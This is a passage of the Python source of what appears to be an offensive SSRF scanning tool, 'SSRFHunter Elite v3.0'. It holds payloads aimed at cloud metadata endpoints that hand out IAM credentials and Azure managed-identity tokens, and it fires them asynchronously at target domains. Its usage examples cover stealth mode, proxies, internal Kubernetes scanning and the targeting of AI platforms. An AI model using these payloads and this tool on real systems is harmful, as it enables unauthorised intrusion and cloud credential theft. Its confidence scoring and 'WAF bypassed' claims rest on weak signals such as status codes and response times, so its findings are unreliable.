            "http://169.254.169.254/latest/meta-data/iam/security-credentials/OracleEBSRole",
        ]
        
        # Azure OpenAI CVE-2025-53767
        azure_openai_payloads = [
            "http://127.0.0.1:5001/v1/models",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://cognitiveservices.azure.com",
        ]
        
        for payload in oracle_payloads + azure_openai_payloads:
            payloads.append({
                'url': base_url,
                'param': 'cve_2025',
                'payload': payload,
                'payload_type': 'cve_2025',
                'technique': 'cve_exploit',
                'cve': 'CVE-2025-61882' if 'oracle' in payload.lower() else 'CVE-2025-53767',
                'cvss': 10.0
            })
        
        self.stats['cve_2025'] += len(payloads)
        return payloads
    
    async def test_ssrf_async_2025(self, session: ClientSession, test_case: Dict):
        """2025: Async SSRF testing with all novel techniques"""
        async with self.semaphore:
            try:
                # Stealth
                if self.options.get('stealth'):
                    await asyncio.sleep(random.uniform(1, 3))
                
                # Prepare request
                headers = {
                    'User-Agent': random.choice(USER_AGENTS_2025),
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                
                # Session support
                if self.options.get('session_name'):
                    cookies, session_headers = self.session_manager.get_session(self.options['session_name'])
                    headers.update(session_headers)
                
                # Proxy
                proxy = self.stealth_engine.get_proxy() if self.options.get('use_proxy') else None
                
                # Measure
                start_time = time.time()
                
                # 2025: WebSocket testing
                if test_case.get('websocket'):
                    ws_result = await self.ws_detector.test_websocket(test_case['url'], test_case['payload'])
                    return self._process_ws_result(test_case, ws_result)
                
                # HTTP request
                async with session.get(
                    test_case['url'],
                    headers=headers,
                    proxy=proxy,
                    ssl=False,
                    timeout=ClientTimeout(total=30)
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    # Analyze
                    result = await self._analyze_response_2025(test_case, response, content, response_time)
                    
                    # Store
                    self.results.append(result.__dict__)
                    
                    # Update stats
                    if result.potential_ssrf:
                        self.stats['potential_findings'] += 1
                    
                    if result.confidence == 'high':
                        self.high_confidence.append(result.__dict__)
                        self.stats['high_confidence'] += 1
                    
                    return result
                    
            except asyncio.TimeoutError:
                return self._timeout_result(test_case)
            except Exception as e:
                return self._error_result(test_case, str(e))
    
    async def _analyze_response_2025(self, test_case: Dict, response, content: str, response_time: float) -> TestResult2025:
        """2025: Advanced response analysis with AI correlation"""
        result = TestResult2025(
            url=test_case['url'],
            param=test_case['param'],
            payload=test_case['payload'],
            payload_type=test_case.get('payload_type', 'unknown'),
            status=response.status,
            content_length=len(content),
            response_time=response_time
        )
        
        indicators = []
        confidence_score = 0
        cvss = test_case.get('cvss', 5.0)
        
        # == 2025: SMART INDICATOR ANALYSIS ==
        
        # Status analysis
        if response.status in [200, 201, 202, 204, 301, 302, 307, 308]:
            indicators.append(f"Interesting status: {response.status}")
            confidence_score += 1
            cvss = max(cvss, 7.5)
        
        # Time-based detection (2025 enhanced)
        if response_time > 15:
            indicators.append("Very slow response (high confidence blind SSRF)")
            confidence_score += 2
            result.potential_ssrf = True
        elif response_time < 0.05:
            indicators.append("Very fast response (internal service confirmed)")
            confidence_score += 2
            cvss = max(cvss, 8.0)
        
        # Content analysis
        if len(content) < 200:
            indicators.append("Tiny response (internal/binary service)")
            confidence_score += 1
        elif len(content) > 10000:
            indicators.append("Large response (potential data exfiltration)")
            confidence_score += 1
            cvss = max(cvss, 9.0)
        
        # WAF detection
        waf_type = self.waf_engine.detect_waf(dict(response.headers))
        if waf_type:
            indicators.append(f"WAF detected: {waf_type}")
            if response.status == 403:
                indicators.append("WAF blocked - trying bypass variants")
                confidence_score -= 1
            else:
                indicators.append("WAF bypassed successfully!")
                confidence_score += 2
        
        # Error detection
        error_patterns = [
            'connection refused', 'timeout', 'unable to connect', 'connection reset',
            'no route to host', 'connection failed', 'ECONNREFUSED', 'ETIMEDOUT',
            'ENETUNREACH', 'connection timed out', 'connect: connection refused'
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in content.lower():
                indicators.append(f"Internal error indicator: {pattern}")
                confidence_score += 1
                result.potential_ssrf = True
        
        # Confidence scoring
        if confidence_score >= 3:
            result.confidence = 'high'
            result.potential_ssrf = True
        elif confidence_score >= 1:
            result.confidence = 'medium'
            result.potential_ssrf = True
        
        result.indicators = indicators
        result.cvss_score = cvss
        
        return result

    def _timeout_result(self, test_case: Dict) -> TestResult2025:
        result = TestResult2025(
            url=test_case['url'],
            param=test_case['param'],
            payload=test_case['payload'],
            error='Timeout',
            potential_ssrf=True,
            confidence='medium',
            indicators=['Request timed out (potential blind SSRF)']
        )
        self.results.append(result.__dict__)
        return result

    def _error_result(self, test_case: Dict, error: str) -> TestResult2025:
        result = TestResult2025(
            url=test_case['url'],
            param=test_case['param'],
            payload=test_case['payload'],
            error=error,
            potential_ssrf=False,
            confidence='low'
        )
        self.results.append(result.__dict__)
        return result
    
    def _process_ws_result(self, test_case: Dict, ws_result: Dict):
        """Process WebSocket result"""
        if ws_result['vulnerable']:
            result = TestResult2025(
                url=test_case['url'],
                param=test_case['param'],
                payload=test_case['payload'],
                status=101,  # Switching Protocols
                content_length=len(ws_result['response']) if ws_result['response'] else 0,
                potential_ssrf=True,
                confidence='high',
                indicators=['WebSocket handshake successful with SSRF payload']
            )
            self.stats['websocket_ssrf'] += 1
        else:
            result = TestResult2025(
                url=test_case['url'],
                param=test_case['param'],
                payload=test_case['payload'],
                error=ws_result['error'],
                potential_ssrf=False,
                confidence='low'
            )
        
        self.results.append(result.__dict__)
        return result
    
    async def run_ssrf_tests_2025(self):
        """2025: Run all SSRF tests with novel techniques"""
        self.log("Generating 2025 SSRF test payloads (GraphQL, WebSocket, Serverless, Container)...")
        
        all_test_cases = []
        for url in self.ssrf_urls:
            payloads = await self.generate_payloads_2025(url)
            all_test_cases.extend(payloads)
        
        self.log(f"Generated {len(all_test_cases)} 2025 test cases")
        self.stats['test_cases'] = len(all_test_cases)
        
        # Async session
        connector = TCPConnector(limit=self.options.get('concurrency', 10))
        timeout = ClientTimeout(total=30)
        
        async with ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [self.test_ssrf_async_2025(session, case) for case in all_test_cases]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.log("2025 SSRF testing completed")
        
        # Save results
        with open(self.results_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Save specialized results
        self._save_specialized_results()
    
    def _save_specialized_results(self):
        """Save 2025 specialized results"""
        # GraphQL results
        graphql_results = [r for r in self.results if r.get('graphql_query')]
        if graphql_results:
            with open(self.graphql_file, 'w') as f:
                json.dump(graphql_results, f, indent=2)
            self.log(f"Saved {len(graphql_results)} GraphQL SSRF results")
        
        # WebSocket results
        ws_results = [r for r in self.results if r.get('websocket_url')]
        if ws_results:
            with open(self.ws_file, 'w') as f:
                json.dump(ws_results, f, indent=2)
            self.log(f"Saved {len(ws_results)} WebSocket SSRF results")
        
        # Serverless results
        serverless_results = [r for r in self.results if r.get('serverless_platform')]
        if serverless_results:
            with open(self.serverless_file, 'w') as f:
                json.dump(serverless_results, f, indent=2)
            self.log(f"Saved {len(serverless_results)} serverless exploitation results")
        
        # Container escape results
        container_results = [r for r in self.results if r.get('k8s_access') or r.get('container_escape')]
        if container_results:
            with open(self.container_file, 'w') as f:
                json.dump(container_results, f, indent=2)
            self.log(f"Saved {len(container_results)} container escape results")
    
    def generate_2025_report(self):
        """2025: Comprehensive markdown report"""
        with open(self.report_file, 'w') as f:
            f.write(f"# SSRFHunter Elite v3.0 Report - 2025 Threat Landscape\n\n")
            f.write(f"**Domain**: {self.domain}  \n")
            f.write(f"**Scan Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  \n")
            f.write(f"**Framework Version**: 3.0 (2025 SSRF Arsenal)  \n\n")
            
            # Executive Summary
            f.write("## 📊 Executive Summary\n\n")
            for key, value in self.stats.items():
                f.write(f"- **{key.replace('_', ' ').title()}**: {value}\n")
            f.write("\n")
            
            self._write_top_findings(f)
            self._write_2025_recommendations(f)

    def _write_top_findings(self, f):
        """Write top findings table"""
        if not self.high_confidence:
            return
        
        f.write("## 📈 Top High-Confidence Findings\n\n")
        f.write("| Param | Type | CVSS | Confidence | Indicators |\n")
        f.write("|-------|------|------|------------|------------|\n")
        
        for result in sorted(self.high_confidence, key=lambda x: x['cvss_score'], reverse=True)[:20]:
            indicators = '<br>'.join(result['indicators'][:2])
            f.write(f"| {result['param']} | {result['payload_type']} | {result['cvss_score']} | {result['confidence']} | {indicators} |\n")
    
    def _write_2025_recommendations(self, f):
        """Write 2025-specific recommendations"""
        f.write("## 💡 2025 Security Recommendations\n\n")
        f.write("### Immediate Actions (Next 24 hours)\n\n")
        
        if self.stats['cloud_metadata'] > 0:
            f.write("1. **🔥 URGENT**: Rotate ALL cloud credentials immediately\n")
            f.write("2. **Enable IMDSv2** on ALL AWS instances (blocks 90% of SSRF)\n")
            f.write("3. **Block metadata IPs** at network level: `169.254.169.254`, `169.254.170.2`\n\n")
        
        if self.stats['container_escape'] > 0:
            f.write("4. **URGENT**: Implement PodSecurityPolicies / OPA Gatekeeper\n")
            f.write("5. **Disable Docker socket**: Remove `/var/run/docker.sock` mounting\n")
            f.write("6. **Enable seccomp/AppArmor** on all containers\n\n")
        
        f.write("### Short-term (Next 7 days)\n\n")
        f.write("7. **Deploy SSRF WAF rules** targeting 2025 patterns\n")
        f.write("8. **Monitor for OOB callbacks**: Set up interactsh/Burp Collaborator\n")
        f.write("9. **Audit GraphQL endpoints**: Disable introspection in production\n")
        f.write("10. **WebSocket validation**: Implement strict origin checking\n\n")
        
        f.write("### Long-term (Next 30 days)\n\n")
        f.write("11. **Zero-trust architecture**: Never trust internal network\n")
        f.write("12. **eBPF monitoring**: Deploy Falco/Sysdig for runtime detection\n")
        f.write("13. **Supply chain security**: Scan all container images for CVE-2025\n")
        f.write("14. **AI security training**: Teams must understand AI-platform SSRF\n")
        f.write("15. **Bug bounty program**: Reward SSRF findings (especially blind SSRF)\n\n")
        
        f.write("### 2025 Emerging Threats to Monitor\n\n")
        f.write("- **AI Platform SSRF**: Azure OpenAI, GCP AI Platform, AWS SageMaker\n")
        f.write("- **Serverless Exploitation**: Function metadata + runtime API abuse\n")
        f.write("- **Kubernetes RBAC**: SSRF to steal service account tokens\n")
        f.write("- **SD-WAN Targeting**: Network device SSRF for lateral movement\n")
        f.write("- **GraphQL Complexity**: Nested resolvers as SSRF vectors\n\n")
    
    async def run_full_scan_2025(self):
        """2025: Complete scanning workflow"""
        self.log("="*70)
        self.log(" SSRFHUNTER ELITE v3.0 - 2025 SSRF ARSENAL")
        self.log("="*70)
        
        # Phase 1: Reconnaissance (2025 enhanced)
        await self.collect_urls_2025()
        self.extract_ssrf_urls_2025()
        
        # Phase 2: SSRF Testing (2025 novel techniques)
        await self.run_ssrf_tests_2025()
        
        # Phase 3: Reporting
        self.generate_2025_report()
        
        # Print stats
        self.log("="*70)
        self.log(" SCAN COMPLETED - 2025 THREAT LANDSCAPE COVERED")
        self.log("="*70)
        for key, value in self.stats.items():
            self.log(f"{key.replace('_', ' ').title()}: {value}")

# == 2025 SESSION MANAGER ==
class SessionManager2025:
    """2025: Advanced session management"""
    def __init__(self):
        self.sessions: Dict[str, Dict] = {}
    
    def add_session(self, name: str, cookies: Dict, headers: Dict, jwt_token: Optional[str] = None):
        """Add session with optional JWT"""
        self.sessions[name] = {
            'cookies': cookies,
            'headers': headers,
            'jwt': jwt_token,
            'created_at': datetime.now().isoformat()
        }
    
    def get_session(self, name: str) -> Tuple[Dict, Dict]:
        session = self.sessions.get(name, {})
        return session.get('cookies', {}), session.get('headers', {})

def main():
    """2025: Main entry point"""
    parser = argparse.ArgumentParser(
        description='SSRFHunter Elite v3.0 - 2025 SSRF Arsenal',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
2025 Usage Examples:
  # Basic 2025 scan
  python ssrfhunter_elite_v3.py -d target.com -o results/
  
  # 2025: AI platform targeting
  python ssrfhunter_elite_v3.py -d openai.azure.com -o results/ --ai-platform
  
  # 2025: Kubernetes internal scan
  python ssrfhunter_elite_v3.py -d k8s.internal -o results/ --internal-scan --container-escape
  
  # 2025: Stealth + authenticated
  python ssrfhunter_elite_v3.py -d target.com -o results/ --stealth --session admin --jwt "eyJhbGci..."
  
  # 2025: Full arsenal
  python ssrfhunter_elite_v3.py -d *.target.com -o results/ --full-arsenal --concurrency 20
        """
    )
    
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-o', '--output', required=True, help='Output directory')
    parser.add_argument('-c', '--concurrency', type=int, default=10, help='Concurrent requests')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--internal-scan', action='store_true', help='Scan internal networks')
    parser.add_argument('--container-escape', action='store_true', help='Test container escape')
    parser.add_argument('--ai-platform', action='store_true', help='Target AI platforms')
    parser.add_argument('--full-arsenal', action='store_true', help='Enable all 2025 features')
    parser.add_argument('--session', help='Session name')
    parser.add_argument('--cookie', help='Cookies (name1=value1;name2=value2)')
    parser.add_argument('--header', help='Headers (Header1:Value1,Header2:Value2)')
    parser.add_argument('--jwt', help='JWT token for authentication')
    
    args = parser.parse_args()
    
    # Options
    options = {
        'concurrency': args.concurrency,
        'stealth': args.stealth or args.full_arsenal,
        'internal_scan': args.internal_scan or args.full_arsenal,
        'container_escape': args.container_escape or args.full_arsenal,
        'ai_platform': args.ai_platform or args.full_arsenal,
        'use_proxy': bool(args.proxy),
        'session_name': args.session
    }
    
    # Initialize
    hunter = SSRFHunterEliteV3(args.domain, args.output, options)
    
    # Configure session
    if args.session:
        cookies = {}
        headers = {}
        jwt_token = args.jwt
        
        if args.cookie:
            for cookie in args.cookie.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookies[name] = value
        
        if args.header:
            for header in args.header.split(','):
                if ':' in header:
                    name, value = header.strip().split(':', 1)
                    headers[name] = value
        
        hunter.session_manager.add_session(args.session, cookies, headers, jwt_token)
    
    # Run
    try:
        asyncio.run(hunter.run_full_scan_2025())
    except KeyboardInterrupt:
        print("\n[!] 2025 scan interrupted")
        sys.exit(1)

if __name__ == "__main__":
    # Check tools
    required = ['gau', 'katana', 'waybackurls', 'urlfinder']
    missing = [tool for tool in required if subprocess.run(['which', tool], capture_output=True).returncode != 0]
    
    if missing:
        print(f"[!] Missing 2025 toolkit: {', '.join(missing)}")
        print("[!] Install: go install github.com/projectdiscovery/katana/cmd/katana@latest")
        # For demonstration purposes, we'll continue even if tools are missing
        # sys.exit(1)
    
    main()
